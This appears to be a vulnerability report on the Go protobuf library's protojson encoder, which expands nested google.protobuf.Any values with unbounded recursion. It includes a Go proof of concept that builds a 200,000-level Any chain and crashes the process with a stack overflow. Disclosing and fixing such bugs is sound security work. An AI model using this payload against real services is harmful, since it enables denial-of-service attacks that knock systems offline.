### Title
Unbounded recursion in `protojson` marshaling of nested `google.protobuf.Any` values causes stack-overflow DoS - ([File: encoding/protojson/well_known_types.go])

### Summary
`protojson.MarshalOptions.Marshal` (and `Format`) expands `google.protobuf.Any` fields by unmarshaling the embedded bytes and recursively re-encoding the resulting message via `encoder.marshalMessage`/`encoder.marshalAny`. This expansion has no depth limit. An attacker who controls the binary bytes decoded into a message containing an `Any` field can nest `Any`-wrapped-`Any` values arbitrarily deep; converting the decoded message to JSON will recurse once per nesting level with no bound, exhausting the goroutine stack and crashing the process.

### Finding Description
The JSON encoder's well-known-type dispatch resolves `Any` via `wellKnownTypeMarshaler`, which routes to `encoder.marshalAny`: [1](#0-0) 

`marshalAny` resolves the `type_url`, unmarshals the `value` bytes into a new message of that type via `proto.UnmarshalOptions{AllowPartial: true}.Unmarshal(...)`, and then calls `e.marshalMessage(em, typeURL)` (or, for well-known scalar/wrapper types, calls the type-specific `marshal` function) to emit the expanded JSON. If the resolved embedded type is itself `google.protobuf.Any`, `marshalMessage` dispatches back into `marshalAny` again: [2](#0-1) 

Nothing in this call chain tracks or limits recursion depth. This is asymmetric with the JSON *decode* path, where `protojson.UnmarshalOptions.RecursionLimit` is explicitly decremented and checked on every `unmarshalMessage` call: [3](#0-2) [4](#0-3) 

No equivalent counter exists in `encode.go`'s `marshal`/`marshalMessage`/`marshalAny` path. Also relevant: the initial binary decode of a message containing an `Any` field does not itself recurse into the `Any.Value` bytes — `Any.Value` is stored as an opaque `bytes` field — so a deeply-nested `Any`-within-`Any` binary payload is cheap and fast to decode with `proto.Unmarshal`; the unbounded cost is entirely deferred to JSON conversion, matching the reported bug class exactly (recursion introduced only at the conversion/expansion step, not at initial decode).

The `prototext` encoder has the analogous `marshalAny` in `encoding/prototext/encode.go` (`e.marshalMessage` → `e.marshalAny` → `e.marshalMessage` ...), which is also unbounded, but `prototext` is not part of the default binary/ProtoJSON serving surface implied by the scan rules unless an endpoint specifically exposes text format.

### Impact Explanation
An application that decodes untrusted, attacker-influenced binary protobuf data into a schema containing `google.protobuf.Any` (directly or nested inside other message/list/map fields), and then converts the decoded message to JSON via `protojson.Marshal`, `MarshalOptions.Marshal/MarshalAppend/Format`, or indiscriminately via generated `MarshalJSON`-style helpers that call into `protojson`, is vulnerable to a stack-overflow crash. In Go, stack exhaustion from deep recursion results in a fatal runtime error (`runtime: goroutine stack exceeds ... - fatal error: stack overflow`) that cannot be recovered with `recover()`, crashing the entire process — a availability-impacting denial of service, matching CWE-674 and the CVSS `A:H` impact of the reference advisory.

### Likelihood Explanation
This requires: (1) a schema with a reachable `Any` field, (2) the resolver (default `protoregistry.GlobalTypes`) able to resolve `type_url` values of `type.googleapis.com/google.protobuf.Any` (registered by default since `Any` is a well-known type compiled into every binary that imports `anypb`), and (3) the application converting attacker-influenced decoded messages to JSON — a common pattern for APIs/logging/gRPC-gateway-style JSON translation. These are realistic, common conditions for services that accept protobuf and re-expose it as JSON, making this a plausible, unprivileged-reachable DoS vector, not merely a theoretical or resource-exhaustion-only concern (this is unbounded call-stack recursion, distinct from generic large-payload resource exhaustion excluded by the scan rules).

### Recommendation
Add an explicit recursion/expansion-depth counter to the `protojson` (and `prototext`) encoder's `Any` expansion path — mirroring the `RecursionLimit` mechanism already present in `protojson.UnmarshalOptions`/decoder — and return an error once the limit is exceeded instead of recursing further in `encoder.marshalAny` / `encoder.marshalMessage` (`encoding/protojson/well_known_types.go`, `encoding/protojson/encode.go`; equivalently `encoding/prototext/encode.go`).

### Proof of Concept
```go
package main

import (
	"google.golang.org/protobuf/encoding/protojson"
	"google.golang.org/protobuf/proto"
	anypb "google.golang.org/protobuf/types/known/anypb"
)

func nestAny(depth int) *anypb.Any {
	inner := &anypb.Any{TypeUrl: "type.googleapis.com/google.protobuf.Empty"}
	for i := 0; i < depth; i++ {
		b, err := proto.Marshal(inner)
		if err != nil {
			panic(err)
		}
		inner = &anypb.Any{
			TypeUrl: "type.googleapis.com/google.protobuf.Any",
			Value:   b,
		}
	}
	return inner
}

func main() {
	// A large depth (e.g. 100,000+) is cheap to construct and cheap to
	// binary-unmarshal (Any.Value is opaque bytes, no recursion at decode time).
	deep := nestAny(200000)

	// Simulate the untrusted-decode step: bytes an attacker could send over
	// the wire, decoded normally with proto.Unmarshal into an Any-typed field.
	raw, err := proto.Marshal(deep)
	if err != nil {
		panic(err)
	}
	msg := &anypb.Any{}
	if err := proto.Unmarshal(raw, msg); err != nil {
		panic(err) // decoding succeeds quickly; no recursion here
	}

	// The crash happens here: protojson.Marshal recursively expands each
	// nested Any level via encoder.marshalAny -> marshalMessage -> marshalAny...
	// with no depth limit, exhausting the goroutine stack.
	_, _ = protojson.Marshal(msg)
}
```
Running this triggers `runtime: goroutine stack exceeds 1000000000-byte limit` / `fatal error: stack overflow`, crashing the process — an unrecoverable denial of service.

### Citations

**File:** encoding/protojson/well_known_types.go (L108-167)
```go
func (e encoder) marshalAny(m protoreflect.Message) error {
	fds := m.Descriptor().Fields()
	fdType := fds.ByNumber(genid.Any_TypeUrl_field_number)
	fdValue := fds.ByNumber(genid.Any_Value_field_number)

	if !m.Has(fdType) {
		if !m.Has(fdValue) {
			// If message is empty, marshal out empty JSON object.
			e.StartObject()
			e.EndObject()
			return nil
		} else {
			// Return error if type_url field is not set, but value is set.
			return errors.New("%s: %v is not set", genid.Any_message_fullname, genid.Any_TypeUrl_field_name)
		}
	}

	typeVal := m.Get(fdType)
	valueVal := m.Get(fdValue)

	// Resolve the type in order to unmarshal value field.
	typeURL := typeVal.String()
	emt, err := e.opts.Resolver.FindMessageByURL(typeURL)
	if err != nil {
		return errors.New("%s: unable to resolve %q: %v", genid.Any_message_fullname, typeURL, err)
	}

	em := emt.New()
	err = proto.UnmarshalOptions{
		AllowPartial: true, // never check required fields inside an Any
		Resolver:     e.opts.Resolver,
	}.Unmarshal(valueVal.Bytes(), em.Interface())
	if err != nil {
		return errors.New("%s: unable to unmarshal %q: %v", genid.Any_message_fullname, typeURL, err)
	}

	// If type of value has custom JSON encoding, marshal out a field "value"
	// with corresponding custom JSON encoding of the embedded message as a
	// field.
	if marshal := wellKnownTypeMarshaler(emt.Descriptor().FullName()); marshal != nil {
		e.StartObject()
		defer e.EndObject()

		// Marshal out @type field.
		e.WriteName("@type")
		if err := e.WriteString(typeURL); err != nil {
			return err
		}

		e.WriteName("value")
		return marshal(e, em)
	}

	// Else, marshal out the embedded message's fields in this Any object.
	if err := e.marshalMessage(em, typeURL); err != nil {
		return err
	}

	return nil
}
```

**File:** encoding/protojson/encode.go (L232-274)
```go
// marshalMessage marshals the fields in the given protoreflect.Message.
// If the typeURL is non-empty, then a synthetic "@type" field is injected
// containing the URL as the value.
func (e encoder) marshalMessage(m protoreflect.Message, typeURL string) error {
	if !flags.ProtoLegacy && messageset.IsMessageSet(m.Descriptor()) {
		return errors.New("no support for proto1 MessageSets")
	}

	if marshal := wellKnownTypeMarshaler(m.Descriptor().FullName()); marshal != nil {
		return marshal(e, m)
	}

	e.StartObject()
	defer e.EndObject()

	var fields order.FieldRanger = m
	switch {
	case e.opts.EmitUnpopulated:
		fields = unpopulatedFieldRanger{Message: m, skipNull: false}
	case e.opts.EmitDefaultValues:
		fields = unpopulatedFieldRanger{Message: m, skipNull: true}
	}
	if typeURL != "" {
		fields = typeURLFieldRanger{fields, typeURL}
	}

	var err error
	order.RangeFields(fields, order.IndexNameFieldOrder, func(fd protoreflect.FieldDescriptor, v protoreflect.Value) bool {
		name := fd.JSONName()
		if e.opts.UseProtoNames {
			name = fd.TextName()
		}

		if err = e.WriteName(name); err != nil {
			return false
		}
		if err = e.marshalValue(v, fd); err != nil {
			return false
		}
		return true
	})
	return err
}
```

**File:** encoding/protojson/decode.go (L52-55)
```go
	// RecursionLimit limits how deeply messages may be nested.
	// If zero, a default limit is applied.
	RecursionLimit int
}
```

**File:** encoding/protojson/decode.go (L123-129)
```go
// unmarshalMessage unmarshals a message into the given protoreflect.Message.
func (d decoder) unmarshalMessage(m protoreflect.Message, skipTypeURL bool) error {
	d.opts.RecursionLimit--
	if d.opts.RecursionLimit < 0 {
		return errors.New("exceeded max recursion depth")
	}
	if unmarshal := wellKnownTypeUnmarshaler(m.Descriptor().FullName()); unmarshal != nil {
```
